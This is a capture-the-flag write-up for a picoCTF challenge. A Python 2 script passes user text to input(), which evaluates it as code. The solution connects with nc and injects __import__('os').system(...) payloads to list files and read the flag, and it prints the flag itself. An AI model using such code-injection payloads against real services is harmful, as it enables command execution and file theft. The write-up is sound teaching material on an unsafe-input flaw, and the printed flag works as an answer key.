# Weird File
Category: Binary Exploitation, 50 points

## Description

A Python file was attached.

```python
#!/usr/bin/python2 -u
import random

cities = open("./city_names.txt").readlines()
city = random.choice(cities).rstrip()
year = 2018

print("What's your favorite number?")
res = None
while not res:
    try:
        res = input("Number? ")
        print("You said: {}".format(res))
    except:
        res = None

if res != year:
    print("Okay...")
else:
    print("I agree!")

print("What's the best city to visit?")
res = None
while not res:
    try:
        res = input("City? ")
        print("You said: {}".format(res))
    except:
        res = None

if res == city:
    print("I agree!")
    flag = open("./flag").read()
    print(flag)
else:
    print("Thanks for your input!")


```

## Solution

This is a standard Python2 `input` challenge. It's a known fact that using [`input`](https://python.readthedocs.io/en/v2.7.2/library/functions.html?highlight=input#input) in Python 2 is dangerous:

> Equivalent to `eval(raw_input(prompt))`.

So, when the program requests input, we can provide it with a Python expression:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Whats_your_input]
└─$ nc mercury.picoctf.net 39137
What's your favorite number?
Number? __import__('os').system('ls')
city_names.txt
flag
in.py
xinet_startup.sh
You said: 0
Number? __import__('os').system('cat flag')
picoCTF{v4lua4bl3_1npu7_8433797}
You said: 0
```

The flag: `picoCTF{v4lua4bl3_1npu7_8433797}`